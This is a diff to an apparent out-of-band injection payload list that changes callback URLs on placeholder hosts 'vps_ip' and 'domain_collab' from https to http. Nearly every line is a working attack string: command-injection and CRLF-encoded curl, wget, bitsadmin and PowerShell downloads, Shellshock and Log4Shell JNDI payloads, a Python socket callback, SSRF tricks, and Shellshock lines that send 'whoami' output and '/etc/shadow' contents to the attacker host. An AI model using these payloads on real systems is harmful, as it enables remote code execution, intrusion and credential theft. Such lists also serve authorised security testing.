@@ -1,7 +1,7 @@
 $(bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt)
 $(`bitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt`)
-$(bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt)
-$(`bitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt`)
+$(bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt)
+$(`bitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt`)
 $class.inspect("java.lang.Runtime").type.getRuntime().exec("ping domain_collab")
 $class.inspect("java.lang.Runtime").type.getRuntime().exec("ping vps_ip")
 $(curl${IFS}domain_collab)
@@ -9,16 +9,16 @@ $(curl${IFS}domain_collab)
 $(curl https://domain_collab/rce_curl.txt)
 $(`curl https://domain_collab/rce_curl.txt`)
 $(`curl https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
-$(curl https://vps_ip:80/rce_curl.txt)
-$(`curl https://vps_ip:80/rce_curl.txt`)
+$(curl http://vps_ip:80/rce_curl.txt)
+$(`curl http://vps_ip:80/rce_curl.txt`)
 $(fetch https://domain_collab/fetch.txt)
 $(`fetch https://domain_collab/fetch.txt`)
-$(fetch https://vps_ip:80/fetch.txt)
-$(`fetch https://vps_ip:80/fetch.txt`)
+$(fetch http://vps_ip:80/fetch.txt)
+$(`fetch http://vps_ip:80/fetch.txt`)
 $(iwr https://domain_collab/iwr.txt -OutFile iwr.txt)
 $(`iwr https://domain_collab/iwr.txt -OutFile iwr.txt`)
-$(iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt)
-$(`iwr https://vps_ip:80/iwr.txt -OutFile iwr.txt`)
+$(iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt)
+$(`iwr http://vps_ip:80/iwr.txt -OutFile iwr.txt`)
 "${jndi:ldap://domain_collab/a}#
 "${jndi:ldap://domain_collab/a}&
 "${jndi:ldap://domain_collab/a}&&
@@ -146,8 +146,8 @@ $(wget https://domain_collab/rce_curl.txt)
 $(`wget https://domain_collab/rce_curl.txt`)
 $(`wget https://domain_collab/.testing/rce_vuln.txt`)
 $(`wget https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
-$(wget https://vps_ip:80/rce_curl.txt)
-$(`wget https://vps_ip:80/rce_curl.txt`)
+$(wget http://vps_ip:80/rce_curl.txt)
+$(`wget http://vps_ip:80/rce_curl.txt`)
 %0acurl${IFS}domain_collab
  %0acurl domain_collab"
 %0aping${IFS}-c2${IFS}domain_collab
@@ -177,13 +177,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0a() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt|
 %0d%0a() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt||
 %0d%0a() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt%00
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-%0d%0a() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+%0d%0a() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt#
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt&
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt&&
@@ -191,13 +191,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt|
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt||
 %0d%0a() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt%00
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-%0d%0a() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+%0d%0a() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt%00
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt#
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt&
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt&&
@@ -205,13 +205,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt|
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt||
 %0d%0abitsadmin /transfer oob_test /priority high https://domain_collab/bitsadmin.txt %temp%\bitsadmin.txt%00
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
-%0d%0abitsadmin /transfer oob_test /priority high https://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt#
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt;
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt|
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt||
+%0d%0abitsadmin /transfer oob_test /priority high http://vps_ip:80/bitsadmin.txt %temp%\bitsadmin.txt%00
 %0d%0acurl https://domain_collab/rce_curl.txt#
 %0d%0acurl https://domain_collab/rce_curl.txt&
 %0d%0acurl https://domain_collab/rce_curl.txt&&
@@ -219,13 +219,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0acurl https://domain_collab/rce_curl.txt|
 %0d%0acurl https://domain_collab/rce_curl.txt||
 %0d%0acurl https://domain_collab/rce_curl.txt%00
-%0d%0acurl https://vps_ip:80/rce_curl.txt#
-%0d%0acurl https://vps_ip:80/rce_curl.txt&
-%0d%0acurl https://vps_ip:80/rce_curl.txt&&
-%0d%0acurl https://vps_ip:80/rce_curl.txt;
-%0d%0acurl https://vps_ip:80/rce_curl.txt|
-%0d%0acurl https://vps_ip:80/rce_curl.txt||
-%0d%0acurl https://vps_ip:80/rce_curl.txt%00
+%0d%0acurl http://vps_ip:80/rce_curl.txt#
+%0d%0acurl http://vps_ip:80/rce_curl.txt&
+%0d%0acurl http://vps_ip:80/rce_curl.txt&&
+%0d%0acurl http://vps_ip:80/rce_curl.txt;
+%0d%0acurl http://vps_ip:80/rce_curl.txt|
+%0d%0acurl http://vps_ip:80/rce_curl.txt||
+%0d%0acurl http://vps_ip:80/rce_curl.txt%00
 %0d%0afetch https://domain_collab/fetch.txt#
 %0d%0afetch https://domain_collab/fetch.txt&
 %0d%0afetch https://domain_collab/fetch.txt&&
@@ -233,13 +233,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0afetch https://domain_collab/fetch.txt|
 %0d%0afetch https://domain_collab/fetch.txt||
 %0d%0afetch https://domain_collab/fetch.txt%00
-%0d%0afetch https://vps_ip:80/fetch.txt#
-%0d%0afetch https://vps_ip:80/fetch.txt&
-%0d%0afetch https://vps_ip:80/fetch.txt&&
-%0d%0afetch https://vps_ip:80/fetch.txt;
-%0d%0afetch https://vps_ip:80/fetch.txt|
-%0d%0afetch https://vps_ip:80/fetch.txt||
-%0d%0afetch https://vps_ip:80/fetch.txt%00
+%0d%0afetch http://vps_ip:80/fetch.txt#
+%0d%0afetch http://vps_ip:80/fetch.txt&
+%0d%0afetch http://vps_ip:80/fetch.txt&&
+%0d%0afetch http://vps_ip:80/fetch.txt;
+%0d%0afetch http://vps_ip:80/fetch.txt|
+%0d%0afetch http://vps_ip:80/fetch.txt||
+%0d%0afetch http://vps_ip:80/fetch.txt%00
 %0d%0aimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")#
 %0d%0aimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")&
 %0d%0aimport os,pty,socket;s=socket.socket();s.connect(("vps_ip",80));s.send(b"python_rce")&&
@@ -254,13 +254,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0aiwr https://domain_collab/iwr.txt -OutFile iwr.txt|
 %0d%0aiwr https://domain_collab/iwr.txt -OutFile iwr.txt||
 %0d%0aiwr https://domain_collab/iwr.txt -OutFile iwr.txt%00
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt#
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt&&
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt;
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt|
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt||
-%0d%0aiwr https://vps_ip:80/iwr.txt -OutFile iwr.txt%00
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt#
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt&&
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt;
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt|
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt||
+%0d%0aiwr http://vps_ip:80/iwr.txt -OutFile iwr.txt%00
 %0d%0aping domain_collab#
 %0d%0aping domain_collab&
 %0d%0aping domain_collab&&
@@ -296,13 +296,13 @@ $(`wget https://vps_ip:80/rce_curl.txt`)
 %0d%0awget https://domain_collab/rce_curl.txt|
 %0d%0awget https://domain_collab/rce_curl.txt||
 %0d%0awget https://domain_collab/rce_curl.txt%00
-%0d%0awget https://vps_ip:80/rce_curl.txt#
-%0d%0awget https://vps_ip:80/rce_curl.txt&
-%0d%0awget https://vps_ip:80/rce_curl.txt&&
-%0d%0awget https://vps_ip:80/rce_curl.txt;
-%0d%0awget https://vps_ip:80/rce_curl.txt|
-%0d%0awget https://vps_ip:80/rce_curl.txt||
-%0d%0awget https://vps_ip:80/rce_curl.txt%00
+%0d%0awget http://vps_ip:80/rce_curl.txt#
+%0d%0awget http://vps_ip:80/rce_curl.txt&
+%0d%0awget http://vps_ip:80/rce_curl.txt&&
+%0d%0awget http://vps_ip:80/rce_curl.txt;
+%0d%0awget http://vps_ip:80/rce_curl.txt|
+%0d%0awget http://vps_ip:80/rce_curl.txt||
+%0d%0awget http://vps_ip:80/rce_curl.txt%00
 //0://domain_collab;http://google.com/
 \0://domain_collab;http://google.com/
 //0://srff2.domain_collab;http://google.com:80/
@@ -958,63 +958,63 @@ BACKUP LOG [TESTING] TO DISK = '//vps_ip/mssql'
 ;() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt%00
 |() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt%00
 ||() { :;}; /bin/bash -c "curl https://domain_collab/shellshock_curl.txt%00
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt#
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt&&
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt;
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt|
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt||
-"() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-&&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-&() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-'() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-;() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-|() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
-||() { :;}; /bin/bash -c "curl https://vps_ip:80/shellshock_curl.txt%00
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt#
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt&&
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt;
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt|
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt||
+"() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+&&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+&() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+'() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+;() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+|() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
+||() { :;}; /bin/bash -c "curl http://vps_ip:80/shellshock_curl.txt%00
 () { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://vps_ip:80/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
@@ -1094,63 +1094,63 @@ BACKUP LOG [TESTING] TO DISK = '//vps_ip/mssql'
 ;() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt%00
 |() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt%00
 ||() { :;}; /bin/bash -c "wget https://domain_collab/shellshock_wget.txt%00
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt#
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt&&
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt;
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt|
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt||
-"() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-&&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-&() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-'() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-;() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-|() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
-||() { :;}; /bin/bash -c "wget https://vps_ip:80/shellshock_wget.txt%00
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&&
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt;
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt|
+"() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt||
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt#
+&&() { :;}; /bin/bash -c "wget http://vps_ip:80/shellshock_wget.txt&
